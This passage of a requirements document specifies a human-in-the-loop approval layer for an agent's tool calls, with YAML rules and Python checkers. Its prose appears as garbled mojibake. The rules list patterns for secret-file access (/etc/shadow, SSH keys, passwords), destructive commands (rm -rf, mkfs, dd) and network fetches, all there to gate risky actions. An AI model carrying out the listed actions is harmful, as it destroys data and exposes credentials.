å®ç°å››å±‚å®¡æ‰¹è§„åˆ™æ£€æµ‹ç³»ç»Ÿ,ä»é«˜åˆ°ä½ä¼˜å…ˆçº§ä¸º:è‡ªå®šä¹‰æ£€æŸ¥å™¨ â†’ å…¨å±€æ¨¡å¼ â†’ å·¥å…·è§„åˆ™ â†’ å†…ç½®è§„åˆ™ã€‚

**æ¶æ„å›¾**:

```
ApprovalChecker.check(tool_name, args)
    â†“
1. å·¥å…·è‡ªå®šä¹‰æ£€æŸ¥å™¨(Python ä»£ç )
   - ä¾‹: check_bash_command(args) â†’ ApprovalDecision
   - ä¼˜å…ˆçº§æœ€é«˜,å¯å®ç°å¤æ‚é€»è¾‘
    â†“ (å¦‚æœé€šè¿‡)
2. å…¨å±€é£é™©æ¨¡å¼(hitl_rules.yaml:global.risk_patterns)
   - è·¨å·¥å…·æ£€æµ‹: å¯†ç ã€API Keyã€ç³»ç»Ÿæ–‡ä»¶
   - é€‚ç”¨äºæ‰€æœ‰å·¥å…·
    â†“ (å¦‚æœé€šè¿‡)
3. å·¥å…·ç‰¹å®šè§„åˆ™(hitl_rules.yaml:tools.xxx)
   - ä¾‹: run_bash_command.patterns.high_risk
   - ä»…é€‚ç”¨äºè¯¥å·¥å…·
    â†“ (å¦‚æœé€šè¿‡)
4. å†…ç½®é»˜è®¤è§„åˆ™(ApprovalChecker._check_builtin_rules)
   - å…œåº•é€»è¾‘,å¸¸è§å±é™©æ“ä½œ
   - å¦‚: rm -rf, sudo, chmod 777
    â†“
è¿”å› ApprovalDecision(needs_approval, reason, risk_level)
```

**ApprovalDecision ç»“æ„**:

```python
@dataclass
class ApprovalDecision:
    needs_approval: bool  # æ˜¯å¦éœ€è¦å®¡æ‰¹
    reason: str           # åŸå› è¯´æ˜
    risk_level: str       # é£é™©çº§åˆ«: critical/high/medium/low
```

**éªŒæ”¶æ ‡å‡†**:
- âœ… æ”¯æŒå››å±‚è§„åˆ™,ä¼˜å…ˆçº§æ­£ç¡®
- âœ… æ¯å±‚å¯ç‹¬ç«‹å¯ç”¨/ç¦ç”¨
- âœ… è¿”å›æ¸…æ™°çš„ ApprovalDecision
- âœ… æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼åŒ¹é…

**å®ç°å‚è€ƒ**:`generalAgent/hitl/approval_checker.py`

---

#### éœ€æ±‚ 3:å…¨å±€é£é™©æ¨¡å¼æ£€æµ‹

**éœ€æ±‚æè¿°**:
å®ç°è·¨å·¥å…·çš„å…¨å±€é£é™©æ¨¡å¼æ£€æµ‹,åœ¨æ‰€æœ‰å·¥å…·æ‰§è¡Œå‰ç»Ÿä¸€æ£€æŸ¥æ•æ„Ÿä¿¡æ¯ã€ç³»ç»Ÿæ–‡ä»¶ç­‰é«˜é£é™©å†…å®¹ã€‚

**é…ç½®ç¤ºä¾‹**(hitl_rules.yaml):

```yaml
global:
  risk_patterns:
    # ä¸¥é‡é£é™©: æ•æ„Ÿä¿¡æ¯æ³„éœ²
    critical:
      patterns:
        - "password\\s*[=:]\\s*['\"]?[\\w.-]+"       # password=xxx
        - "api[_-]?key\\s*[=:]\\s*['\"]?[\\w-]+"     # api_key=xxx
        - "secret\\s*[=:]\\s*['\"]?[\\w.-]+"         # secret=xxx
        - "token\\s*[=:]\\s*['\"]?[\\w.-]+"          # token=xxx
        - "BEGIN (RSA|DSA|EC) PRIVATE KEY"           # PEM ç§é’¥
      action: require_approval
      reason: "æ£€æµ‹åˆ°æ•æ„Ÿä¿¡æ¯(å¯†ç /å¯†é’¥/ä»¤ç‰Œ)"

    # é«˜é£é™©: ç³»ç»Ÿæ–‡ä»¶/æ•°æ®åº“æ“ä½œ
    high:
      patterns:
        - "/etc/passwd"                              # ç³»ç»Ÿç”¨æˆ·æ–‡ä»¶
        - "/etc/shadow"                              # ç³»ç»Ÿå¯†ç æ–‡ä»¶
        - "~/.ssh/id_rsa"                           # SSH ç§é’¥
        - "DROP\\s+(TABLE|DATABASE)"                 # SQL åˆ é™¤
        - "DELETE\\s+FROM.*WHERE\\s+1=1"            # SQL å…¨åˆ 
      action: require_approval
      reason: "æ£€æµ‹åˆ°é«˜é£é™©æ“ä½œ(ç³»ç»Ÿæ–‡ä»¶/æ•°æ®åº“åˆ é™¤)"

    # ä¸­ç­‰é£é™©: å¯ç–‘æ¨¡å¼
    medium:
      patterns:
        - "\\bexec\\s*\\("                           # ä»£ç æ‰§è¡Œ
        - "\\beval\\s*\\("                           # åŠ¨æ€æ‰§è¡Œ
        - "\\.env$"                                  # ç¯å¢ƒå˜é‡æ–‡ä»¶
      action: require_approval
      reason: "æ£€æµ‹åˆ°å¯ç–‘æ¨¡å¼(ä»£ç æ‰§è¡Œ/ç¯å¢ƒå˜é‡)"
```

**æ£€æµ‹é€»è¾‘**:

```python
# å°†æ‰€æœ‰å‚æ•°å€¼æ‹¼æ¥ä¸ºå­—ç¬¦ä¸²
args_str = " ".join(str(v) for v in args.values())

# æŒ‰ä¼˜å…ˆçº§æ£€æŸ¥(critical > high > medium > low)
for risk_level in ["critical", "high", "medium", "low"]:
    for pattern in patterns[risk_level]:
        if re.search(pattern, args_str, re.IGNORECASE):
            return ApprovalDecision(
                needs_approval=True,
                reason=f"æ£€æµ‹åˆ°æ•æ„Ÿä¿¡æ¯(...)",
                risk_level=risk_level
            )
```

**é€‚ç”¨å·¥å…·**:
- run_bash_command: æ£€æµ‹å‘½ä»¤ä¸­çš„å¯†ç ã€API Key
- http_fetch: æ£€æµ‹ URL ä¸­çš„æ•æ„Ÿä¿¡æ¯
- write_file: æ£€æµ‹æ–‡ä»¶å†…å®¹ä¸­çš„ç§é’¥ã€token
- æ‰€æœ‰å…¶ä»–å·¥å…·(é€šç”¨æ£€æµ‹)

**éªŒæ”¶æ ‡å‡†**:
- âœ… æ”¯æŒ critical/high/medium/low å››çº§é£é™©
- âœ… æ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼åŒ¹é…(ä¸åŒºåˆ†å¤§å°å†™)
- âœ… ä¼˜å…ˆçº§é«˜äºå·¥å…·ç‰¹å®šè§„åˆ™
- âœ… å¯é…ç½® action(require_approval/allow/deny)

**å®ç°å‚è€ƒ**:`generalAgent/hitl/approval_checker.py:_check_global_patterns`

---

#### éœ€æ±‚ 4:å·¥å…·ç‰¹å®šå®¡æ‰¹è§„åˆ™

**éœ€æ±‚æè¿°**:
ä¸ºç‰¹å®šå·¥å…·é…ç½®ä¸“ç”¨å®¡æ‰¹è§„åˆ™,æ”¯æŒå¤šé£é™©çº§åˆ«ã€è‡ªå®šä¹‰æ¨¡å¼ã€çµæ´»åŠ¨ä½œæ§åˆ¶ã€‚

**é…ç½®ç¤ºä¾‹**(run_bash_command):

```yaml
tools:
  run_bash_command:
    enabled: true  # å¯ç”¨å®¡æ‰¹

    patterns:
      # é«˜é£é™©æ“ä½œ
      high_risk:
        - "rm\\s+-rf"           # å¼ºåˆ¶åˆ é™¤
        - "sudo"                # ææƒæ“ä½œ
        - "chmod\\s+777"        # å±é™©æƒé™
        - "mkfs"                # æ ¼å¼åŒ–ç£ç›˜
        - "dd.*if=/dev/"        # ç£ç›˜å†™å…¥

      # ä¸­ç­‰é£é™©æ“ä½œ
      medium_risk:
        - "curl"                # ç½‘ç»œè¯·æ±‚
        - "wget"                # ä¸‹è½½æ–‡ä»¶
        - "pip\\s+install"      # å®‰è£…åŒ…
        - "docker"              # Docker æ“ä½œ

    actions:
      high_risk: require_approval
      medium_risk: require_approval
```

**é…ç½®ç¤ºä¾‹**(http_fetch):

```yaml
tools:
  http_fetch:
    enabled: true

    rules:
      - pattern: "localhost"
        action: require_approval
        reason: "è®¿é—®æœ¬åœ°æœåŠ¡"

      - pattern: "127\\.0\\.0\\.1"
        action: require_approval
        reason: "è®¿é—®æœ¬åœ°åœ°å€"

      - pattern: "192\\.168\\."
        action: require_approval
        reason: "è®¿é—®å†…ç½‘åœ°å€"
```

**æ”¯æŒçš„ action**:
- `require_approval`: éœ€è¦ç”¨æˆ·æ‰¹å‡†
- `allow`: ç›´æ¥å…è®¸(è·³è¿‡å®¡æ‰¹)
- `deny`: ç›´æ¥æ‹’ç»(ç¦æ­¢æ‰§è¡Œ)

**éªŒæ”¶æ ‡å‡†**:
- âœ… æ”¯æŒå¤šé£é™©çº§åˆ«(high_risk/medium_risk/low_risk)
- âœ… æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼æ¨¡å¼
- âœ… æ”¯æŒè‡ªå®šä¹‰ reason
- âœ… å¯é€šè¿‡ enabled: false ä¸´æ—¶ç¦ç”¨

**å®ç°å‚è€ƒ**:`generalAgent/config/hitl_rules.yaml`ã€`generalAgent/hitl/approval_checker.py:_check_config_rules`

---

#### éœ€æ±‚ 5:è‡ªå®šä¹‰æ£€æŸ¥å™¨(ä»£ç å®ç°)

**éœ€æ±‚æè¿°**:
æ”¯æŒé€šè¿‡ Python ä»£ç æ³¨å†Œè‡ªå®šä¹‰å®¡æ‰¹æ£€æŸ¥å™¨,å®ç°å¤æ‚çš„å®¡æ‰¹é€»è¾‘(å¦‚è°ƒç”¨å¤–éƒ¨ APIã€å¤šæ¡ä»¶åˆ¤æ–­)ã€‚

**æ³¨å†Œæ¥å£**:

```python
def register_checker(
    tool_name: str,
    checker: Callable[[dict], ApprovalDecision]
):
    """æ³¨å†Œå·¥å…·è‡ªå®šä¹‰å®¡æ‰¹æ£€æµ‹å‡½æ•°

    Args:
        tool_name: å·¥å…·åç§°
        checker: æ£€æµ‹å‡½æ•°,æ¥æ”¶ args,è¿”å› ApprovalDecision
    """
```

**ä½¿ç”¨ç¤ºä¾‹**:

```python
# è‡ªå®šä¹‰æ£€æŸ¥å™¨: å¤æ‚çš„ bash å‘½ä»¤æ£€æµ‹
def check_bash_command_advanced(args: dict) -> ApprovalDecision:
    command = args.get("command", "")

    # æ£€æŸ¥æ˜¯å¦åˆ é™¤è¶…è¿‡ 10 ä¸ªæ–‡ä»¶
    if "rm" in command:
        file_count = len(re.findall(r'\S+\.(txt|log|tmp)', command))
        if file_count > 10:
            return ApprovalDecision(
                needs_approval=True,
                reason=f"å°†åˆ é™¤ {file_count} ä¸ªæ–‡ä»¶",
                risk_level="high"
            )

    # æ£€æŸ¥æ˜¯å¦è®¿é—®æ•°æ®åº“
    if any(db in command for db in ["mysql", "psql", "mongo"]):
        return ApprovalDecision(
            needs_approval=True,
            reason="æ‰§è¡Œæ•°æ®åº“æ“ä½œ",
            risk_level="medium"
        )

    return ApprovalDecision(needs_approval=False)

# æ³¨å†Œæ£€æŸ¥å™¨
approval_checker.register_checker("run_bash_command", check_bash_command_advanced)
```

**è°ƒç”¨å¤–éƒ¨ API ç¤ºä¾‹**:

```python
def check_url_reputation(args: dict) -> ApprovalDecision:
    url = args.get("url", "")

    # è°ƒç”¨ VirusTotal API æ£€æŸ¥ URL ä¿¡èª‰
    response = requests.get(f"https://virustotal.com/api/v3/urls/{url}")

    if response.json().get("malicious_count", 0) > 0:
        return ApprovalDecision(
            needs_approval=True,
            reason="URL è¢«æ ‡è®°ä¸ºæ¶æ„ç«™ç‚¹",
            risk_level="critical"
        )

    return ApprovalDecision(needs_approval=False)

approval_checker.register_checker("http_fetch", check_url_reputation)
```

**éªŒæ”¶æ ‡å‡†**:
- âœ… æ”¯æŒæ³¨å†Œä»»æ„å·¥å…·çš„æ£€æŸ¥å™¨
- âœ… æ£€æŸ¥å™¨ä¼˜å…ˆçº§æœ€é«˜(ç¬¬ä¸€å±‚)
- âœ… æ£€æŸ¥å™¨å¯è®¿é—®å®Œæ•´çš„ args å­—å…¸
- âœ… æ”¯æŒå¼‚æ­¥æ£€æŸ¥å™¨(async def)

**å®ç°å‚è€ƒ**:`generalAgent/hitl/approval_checker.py:register_checker`

---

#### éœ€æ±‚ 6:ApprovalToolNode(å®¡æ‰¹æ‹¦æˆªèŠ‚ç‚¹)

**éœ€æ±‚æè¿°**:
å®ç° ApprovalToolNode,åŒ…è£… LangGraph çš„ ToolNode,åœ¨å·¥å…·æ‰§è¡Œå‰æ‹¦æˆªå¹¶æ£€æŸ¥å®¡æ‰¹éœ€æ±‚ã€‚

**æ ¸å¿ƒé€»è¾‘**:

```python
class ApprovalToolNode:
    async def __call__(self, state: Dict) -> Dict:
        messages = state["messages"]
        last_msg = messages[-1]  # AIMessage with tool_calls

        rejected_calls = []

        # æ£€æŸ¥æ¯ä¸ª tool_call
        for tool_call in last_msg.tool_calls:
            tool_name = tool_call["name"]
            tool_args = tool_call["args"]

            # è°ƒç”¨ ApprovalChecker
            decision = self.approval_checker.check(tool_name, tool_args)

            if decision.needs_approval:
                # è§¦å‘ interrupt(å®¡æ‰¹å¯¹ LLM é€æ˜)
                user_decision = interrupt({
                    "type": "tool_approval",
                    "tool": tool_name,
                    "args": tool_args,
                    "reason": decision.reason,
                    "risk_level": decision.risk_level
                })

                if user_decision == "reject":
                    rejected_calls.append(tool_call)

        # å¦‚æœæœ‰æ‹’ç»,è¿”å›æ‹’ç»æ¶ˆæ¯
        if rejected_calls:
            return {
                "messages": [
                    ToolMessage(
                        content="âŒ æ“ä½œå·²å–æ¶ˆ: ...",
                        tool_call_id=call["id"]
                    )
                    for call in rejected_calls
                ]
            }

        # æ‰€æœ‰é€šè¿‡,æ­£å¸¸æ‰§è¡Œå·¥å…·
        return await self.tool_node.ainvoke(state)
```

**å®¡æ‰¹é€æ˜æ€§**:

```
å…³é”®è®¾è®¡: interrupt() çš„æ•°æ®ä¸è¿›å…¥å¯¹è¯å†å²

âŒ é”™è¯¯åšæ³•:
messages += [HumanMessage("ç”¨æˆ·æ‰¹å‡†äº†æ“ä½œ")]  # æ±¡æŸ“å†å²

âœ… æ­£ç¡®åšæ³•:
interrupt() â†’ ç”¨æˆ·å†³ç­– â†’ ç›´æ¥è¿”å›æ‰§è¡Œç»“æœ
                         (å®¡æ‰¹è¿‡ç¨‹å¯¹ LLM ä¸å¯è§)
```

**ç”¨æˆ·äº¤äº’ç•Œé¢**(CLI å®ç°):

```python
# generalAgent/cli.py
def handle_tool_approval(self, interrupt_data: dict):
    tool = interrupt_data["tool"]
    args = interrupt_data["args"]
    reason = interrupt_data["reason"]
    risk_level = interrupt_data["risk_level"]

    print(f"\nğŸ›¡ï¸  å·¥å…·å®¡æ‰¹: {tool}")
    print(f"   é£é™©çº§åˆ«: {risk_level}")
    print(f"   åŸå› : {reason}")
    print(f"   å‚æ•°: {args}")

    choice = input("   æ‰¹å‡†? [y/n] > ").strip().lower()

    return "approve" if choice == "y" else "reject"
```

**éªŒæ”¶æ ‡å‡†**:
- âœ… å®¡æ‰¹è¿‡ç¨‹å¯¹ LLM å®Œå…¨é€æ˜
- âœ… æ”¯æŒå¤šä¸ª tool_calls æ‰¹é‡æ£€æŸ¥
- âœ… æ‹’ç»æ¶ˆæ¯ä»¥ ToolMessage å½¢å¼è¿”å›
- âœ… å¯é€šè¿‡ enable_approval=False ä¸´æ—¶å…³é—­

**å®ç°å‚è€ƒ**:`generalAgent/hitl/approval_node.py`

---

#### éœ€æ±‚ 7:å†…ç½®é»˜è®¤è§„åˆ™

**éœ€æ±‚æè¿°**:
æä¾›å¸¸è§å±é™©æ“ä½œçš„å†…ç½®è§„åˆ™ä½œä¸ºå…œåº•é€»è¾‘,å½“é…ç½®æ–‡ä»¶æœªè¦†ç›–æ—¶è‡ªåŠ¨ç”Ÿæ•ˆã€‚

**run_bash_command å†…ç½®è§„åˆ™**:

```python
def _check_bash_command(command: str) -> ApprovalDecision:
    # é«˜é£é™©æ“ä½œ
    high_risk_patterns = [
        r"\brm\s+-rf\b",          # rm -rf
        r"\bsudo\b",              # sudo
        r"\bchmod\s+777\b",       # chmod 777
        r"\bmkfs\b",              # æ ¼å¼åŒ–ç£ç›˜
        r"\bdd\b.*\bif=/dev/",    # dd å†™ç£ç›˜
        r"\b>\s*/dev/",           # é‡å®šå‘åˆ°è®¾å¤‡
    ]

    for pattern in high_risk_patterns:
        if re.search(pattern, command, re.IGNORECASE):
            return ApprovalDecision(
                needs_approval=True,
                reason="æ£€æµ‹åˆ°é«˜é£é™©æ“ä½œ",
                risk_level="high"
            )

    # ä¸­ç­‰é£é™©æ“ä½œ
    medium_risk_patterns = [
        r"\bcurl\b",              # ç½‘ç»œè¯·æ±‚
        r"\bwget\b",              # ä¸‹è½½æ–‡ä»¶
        r"\bgit\s+clone\b",       # å…‹éš†ä»“åº“
        r"\bpip\s+install\b",     # å®‰è£… Python åŒ…
        r"\bnpm\s+install\b",     # å®‰è£… Node åŒ…
    ]

    for pattern in medium_risk_patterns:
        if re.search(pattern, command, re.IGNORECASE):
            return ApprovalDecision(
                needs_approval=True,
                reason="æ£€æµ‹åˆ°ç½‘ç»œ/å®‰è£…æ“ä½œ",
                risk_level="medium"
            )

    return ApprovalDecision(needs_approval=False)
```

**http_fetch å†…ç½®è§„åˆ™**:

```python
def _check_http_fetch(url: str) -> ApprovalDecision:
    # æ£€æŸ¥æœ¬åœ°/å†…ç½‘åœ°å€
    local_patterns = [
        r"localhost",
        r"127\.0\.0\.1",
        r"192\.168\.",
        r"10\.",
        r"172\.(1[6-9]|2[0-9]|3[0-1])\.",  # 172.16-31.x.x
    ]

    for pattern in local_patterns:
        if re.search(pattern, url, re.IGNORECASE):
            return ApprovalDecision(
                needs_approval=True,
                reason="è®¿é—®æœ¬åœ°/å†…ç½‘åœ°å€",
                risk_level="medium"
            )

    return ApprovalDecision(needs_approval=False)
```

**éªŒæ”¶æ ‡å‡†**:
- âœ… è¦†ç›–å¸¸è§å±é™©æ“ä½œ(rm -rf, sudo, chmod 777)
- âœ… æ£€æµ‹ç½‘ç»œæ“ä½œ(curl, wget)
- âœ… æ£€æµ‹å†…ç½‘åœ°å€è®¿é—®
- âœ… é…ç½®æ–‡ä»¶è§„åˆ™ä¼˜å…ˆçº§é«˜äºå†…ç½®è§„åˆ™

**å®ç°å‚è€ƒ**:`generalAgent/hitl/approval_checker.py:_check_builtin_rules`

---

### éåŠŸèƒ½éœ€æ±‚

#### æ€§èƒ½éœ€æ±‚

| æŒ‡æ ‡ | ç›®æ ‡å€¼ | æµ‹é‡æ–¹æ³• |
|------|--------|---------|
| å®¡æ‰¹æ£€æŸ¥è€—æ—¶ | <50ms | ApprovalChecker.check() æ‰§è¡Œæ—¶é—´ |
| æ­£åˆ™åŒ¹é…æ•ˆç‡ | <10ms | å•ä¸ªæ¨¡å¼åŒ¹é…æ—¶é—´ |
| interrupt å“åº” | <100ms | è§¦å‘åˆ°ç”¨æˆ·çœ‹åˆ°æç¤ºçš„æ—¶é—´ |
| ç”¨æˆ·è¾“å…¥è¶…æ—¶ | 60s(å¯é…ç½®) | ask_human ç­‰å¾…æ—¶é—´ |

#### å®‰å…¨æ€§éœ€æ±‚

| éœ€æ±‚ | è¯´æ˜ | éªŒæ”¶æ ‡å‡† |
|------|------|----------|
| å®¡æ‰¹é€æ˜æ€§ | å®¡æ‰¹è¿‡ç¨‹ä¸è¿›å…¥å¯¹è¯å†å² | LLM çœ‹ä¸åˆ°å®¡æ‰¹äº¤äº’ |
| æ­£åˆ™å®‰å…¨æ€§ | é˜²æ­¢ ReDoS æ”»å‡» | ä½¿ç”¨å®‰å…¨çš„æ­£åˆ™åº“ |
| é…ç½®éªŒè¯ | YAML æ ¼å¼é”™è¯¯æ—¶é™çº§åˆ°å†…ç½®è§„åˆ™ | å¼‚å¸¸æ•è·æµ‹è¯• |
| æ‹’ç»é»˜è®¤ | ç”¨æˆ·æœªè¾“å…¥æ—¶é»˜è®¤æ‹’ç» | è¶…æ—¶æµ‹è¯• |

#### å¯ç”¨æ€§éœ€æ±‚

| éœ€æ±‚ | è¯´æ˜ | éªŒæ”¶æ ‡å‡† |
|------|------|----------|
| é”™è¯¯æç¤ºæ¸…æ™° | æ‹’ç»åŸå› æ˜ç¡®æŒ‡å‡ºé£é™©ç‚¹ | ç”¨æˆ·ç†è§£ç‡ 100% |
| å®¡æ‰¹ UI ç®€æ´ | ä¿¡æ¯å±•ç¤ºç´§å‡‘,ä¸è¶…è¿‡ 5 è¡Œ | UI è¯„å®¡ |
| é…ç½®æ˜“è¯»æ€§ | YAML æ³¨é‡Šå®Œæ•´,ç¤ºä¾‹å……è¶³ | å¼€å‘è€… 5 åˆ†é’Ÿä¸Šæ‰‹ |
| æ—¥å¿—å¯è¿½æº¯ | è®°å½•æ‰€æœ‰å®¡æ‰¹å†³ç­– | å®¡è®¡æ—¥å¿—å®Œæ•´æ€§ |

---

### å‚è€ƒä»£ç ä½ç½®

| åŠŸèƒ½æ¨¡å— | ä»£ç è·¯å¾„ |
|---------|---------|
| ApprovalChecker | `generalAgent/hitl/approval_checker.py` |
| ApprovalToolNode | `generalAgent/hitl/approval_node.py` |
| å®¡æ‰¹è§„åˆ™é…ç½® | `generalAgent/config/hitl_rules.yaml` |
| ask_human å·¥å…· | `generalAgent/tools/builtin/ask_human.py` |
| CLI å®¡æ‰¹å¤„ç† | `generalAgent/cli.py` (handle_tool_approval) |
| Graph é›†æˆ | `generalAgent/graph/builder.py:111-120` |

---

## ä¹ã€å·¥ä½œåŒºç®¡ç†

### äº§å“å®šä½

å·¥ä½œåŒºç®¡ç†æ˜¯æ¡†æ¶çš„æ–‡ä»¶éš”ç¦»å±‚,ä¸ºæ¯ä¸ªä¼šè¯æä¾›ç‹¬ç«‹çš„æ–‡ä»¶ç©ºé—´,æ”¯æŒæŠ€èƒ½é“¾æ¥ã€æ–‡ä»¶ä¸Šä¼ ã€è¾“å‡ºéš”ç¦»ã€‚é€šè¿‡WorkspaceManagerå®ç°è·¯å¾„å®‰å…¨ã€è‡ªåŠ¨æ¸…ç†ã€ä¾èµ–å®‰è£…ç­‰åŠŸèƒ½ã€‚

### ä¸»è¦åŠŸèƒ½

å·¥ä½œåŒºç®¡ç†çš„è¯¦ç»†åŠŸèƒ½å·²åœ¨ä»¥ä¸‹ç« èŠ‚ä¸­æ¶µç›–:

- **å·¥ä½œåŒºç»“æ„** â†’ å‚è§ **äºŒã€æŠ€èƒ½ç³»ç»Ÿ - å·¥ä½œåŒºéš”ç¦»** (ç¬¬402-410è¡Œ)
  - `workspace/{session_id}/skills/` - æŠ€èƒ½ç¬¦å·é“¾æ¥(åªè¯»)
  - `workspace/{session_id}/uploads/` - ç”¨æˆ·ä¸Šä¼ æ–‡ä»¶
  - `workspace/{session_id}/outputs/` - Agentç”Ÿæˆè¾“å‡º
  - `workspace/{session_id}/temp/` - ä¸´æ—¶æ–‡ä»¶

- **æŠ€èƒ½é“¾æ¥æœºåˆ¶** â†’ å‚è§ **äºŒã€æŠ€èƒ½ç³»ç»Ÿ - éœ€æ±‚4: æŠ€èƒ½å·¥ä½œåŒºé“¾æ¥** (ç¬¬402-425è¡Œ)
  - ç¬¦å·é“¾æ¥åˆ›å»º
  - ä¾èµ–è‡ªåŠ¨å®‰è£…
  - è·¯å¾„å®‰å…¨æ£€æŸ¥

- **å·¥å…·è·¯å¾„é™åˆ¶** â†’ å‚è§ **ä¸€ã€å·¥å…·ç³»ç»Ÿ - éœ€æ±‚5: æ–‡ä»¶æ“ä½œå·¥å…·é›†** (ç¬¬90-160è¡Œ)
  - write_fileåªèƒ½å†™outputs/å’Œtemp/
  - read_fileå¯ä»¥è¯»skills/å’Œuploads/
  - è·¯å¾„å®‰å…¨éªŒè¯

- **å·¥ä½œåŒºç»§æ‰¿** â†’ å‚è§ **å…«ã€å¤šAgentåä½œ - éœ€æ±‚6: ä¸Šä¸‹æ–‡éš”ç¦»ä¸ç»§æ‰¿** (ç¬¬1797-1847è¡Œ)
  - Subagentç»§æ‰¿ä¸»Agentçš„workspace_path
  - å…±äº«uploads/å’Œoutputs/ç›®å½•

### å‚è€ƒä»£ç ä½ç½®

| åŠŸèƒ½æ¨¡å— | æ–‡ä»¶è·¯å¾„ | è¯´æ˜ |
|---------|---------|------|
| WorkspaceManager | `shared/workspace/manager.py` | å·¥ä½œåŒºç”Ÿå‘½å‘¨æœŸç®¡ç† |
| æŠ€èƒ½é“¾æ¥ | `shared/workspace/manager.py:link_skill()` | ç¬¦å·é“¾æ¥åˆ›å»º |
| ä¾èµ–å®‰è£… | `shared/workspace/manager.py:link_skill()` | requirements.txtå¤„ç† |
| è·¯å¾„éªŒè¯ | `generalAgent/tools/builtin/file_ops.py` | is_safe_path()æ£€æŸ¥ |
| è‡ªåŠ¨æ¸…ç† | `shared/workspace/manager.py:cleanup_old_workspaces()` | 7å¤©è¿‡æœŸæ¸…ç† |

---

## åã€æ–‡ä»¶å¤„ç†

### äº§å“å®šä½

æ–‡ä»¶å¤„ç†æ˜¯æ¡†æ¶çš„I/Oèƒ½åŠ›å±‚,æä¾›ç»Ÿä¸€çš„æ–‡ä»¶è¯»å†™ã€æœç´¢ã€æŸ¥æ‰¾æ¥å£,æ”¯æŒå¤šç§æ–‡æ¡£æ ¼å¼(PDF/DOCX/XLSX/PPTX)çš„è‡ªåŠ¨è§£æå’Œç´¢å¼•ã€‚

### ä¸»è¦åŠŸèƒ½

æ–‡ä»¶å¤„ç†çš„è¯¦ç»†åŠŸèƒ½å·²åœ¨ä»¥ä¸‹ç« èŠ‚ä¸­æ¶µç›–:

- **æ–‡ä»¶æ“ä½œå·¥å…·é›†** â†’ å‚è§ **ä¸€ã€å·¥å…·ç³»ç»Ÿ - éœ€æ±‚5: æ–‡ä»¶æ“ä½œå·¥å…·é›†** (ç¬¬85-160è¡Œ)
  - `read_file`: è¯»å–æ–‡æœ¬å’Œæ–‡æ¡£(æ”¯æŒPDF/DOCX/XLSX/PPTXé¢„è§ˆ)
  - `write_file`: å†™å…¥æ–‡ä»¶åˆ°outputs/æˆ–temp/
  - `edit_file`: åŸºäºdiffçš„ç²¾ç¡®ç¼–è¾‘
  - `find_files`: Globæ¨¡å¼æ–‡ä»¶åæœç´¢
  - `search_file`: å…¨æ–‡å†…å®¹æœç´¢(æ”¯æŒæ–‡æ¡£ç´¢å¼•)
  - `list_workspace_files`: åˆ—å‡ºå·¥ä½œåŒºæ–‡ä»¶

- **æ–‡æ¡£æ ¼å¼æ”¯æŒ** â†’ å‚è§ **ä¸€ã€å·¥å…·ç³»ç»Ÿ - read_fileå·¥å…·** (ç¬¬85-110è¡Œ)
  - PDF: åˆ†é¡µé¢„è§ˆ,å‰10é¡µæˆ–å…¨æ–‡
  - DOCX: æ®µè½é¢„è§ˆ,å‰10é¡µæˆ–å…¨æ–‡
  - XLSX: å·¥ä½œè¡¨é¢„è§ˆ,å‰3ä¸ªsheet
  - PPTX: å¹»ç¯ç‰‡é¢„è§ˆ,å‰15å¼ 
  - æ–‡æœ¬æ–‡ä»¶: ç›´æ¥è¯»å–(<100KB)æˆ–æˆªæ–­(>100KB)

- **æ–‡æ¡£ç´¢å¼•ä¸æœç´¢** â†’ å‚è§ **ä¸€ã€å·¥å…·ç³»ç»Ÿ - search_fileå·¥å…·** (ç¬¬140-160è¡Œ)
  - FTS5å…¨æ–‡ç´¢å¼•(SQLite)
  - MD5å»é‡(è·¨ä¼šè¯å¤ç”¨ç´¢å¼•)
  - å¤šç­–ç•¥è¯„åˆ†:çŸ­è¯­(10åˆ†) > ä¸‰å…ƒç»„(5åˆ†) > äºŒå…ƒç»„(3åˆ†) > å…³é”®è¯(2åˆ†)
  - è‡ªåŠ¨ç´¢å¼•æ„å»º(é¦–æ¬¡2-5ç§’,åç»­<100ms)

- **æ–‡ä»¶ä¸Šä¼ è‡ªåŠ¨å¤„ç†** â†’ å‚è§ **äºŒã€æŠ€èƒ½ç³»ç»Ÿ - éœ€æ±‚2: æ–‡ä»¶ä¸Šä¼ è‡ªåŠ¨åŠ è½½** (ç¬¬330-360è¡Œ)
  - ä¸Šä¼ PDFè‡ªåŠ¨åŠ è½½@pdfæŠ€èƒ½
  - ä¸Šä¼ DOCXè‡ªåŠ¨åŠ è½½@docxæŠ€èƒ½
  - åŠ¨æ€hintsç”Ÿæˆ

### æ ¸å¿ƒç‰¹æ€§

#### æ–‡æ¡£é¢„è§ˆç­–ç•¥

**å°æ–‡ä»¶**(â‰¤é˜ˆå€¼):
- PDF/DOCX: â‰¤10é¡µ â†’ å…¨æ–‡è¿”å›
- XLSX: â‰¤3ä¸ªsheet â†’ å…¨éƒ¨è¿”å›
- PPTX: â‰¤15å¼ å¹»ç¯ç‰‡ â†’ å…¨éƒ¨è¿”å›

**å¤§æ–‡ä»¶**(>é˜ˆå€¼):
- è¿”å›å‰Né¡µ/sheet/å¹»ç¯ç‰‡é¢„è§ˆ
- æç¤ºä½¿ç”¨search_fileæœç´¢å…·ä½“å†…å®¹
- é¿å…Tokenæµªè´¹

#### ç´¢å¼•ç®¡ç†

**å…¨å±€ç´¢å¼•å­˜å‚¨**:
- è·¯å¾„: `data/indexes/{md5[:2]}/{md5}.db`
- ä¸¤çº§ç›®å½•ç»“æ„(é¿å…å•ç›®å½•æ–‡ä»¶è¿‡å¤š)
- è·¨ä¼šè¯å¤ç”¨(ç›¸åŒå†…å®¹å…±äº«ç´¢å¼•)

**è‡ªåŠ¨æ¸…ç†**:
- æ–‡ä»¶æ›¿æ¢æ—¶åˆ é™¤æ—§ç´¢å¼•(MD5å˜åŒ–)
- å®šæœŸæ¸…ç†å­¤å„¿ç´¢å¼•(24å°æ—¶æœªè®¿é—®)

### å‚è€ƒä»£ç ä½ç½®

| åŠŸèƒ½æ¨¡å— | æ–‡ä»¶è·¯å¾„ | è¯´æ˜ |
|---------|---------|------|
| æ–‡ä»¶æ“ä½œå·¥å…· | `generalAgent/tools/builtin/file_ops.py` | read/write/edit/list |
| æ–‡ä»¶æŸ¥æ‰¾ | `generalAgent/tools/builtin/find_files.py` | Globæ¨¡å¼æœç´¢ |
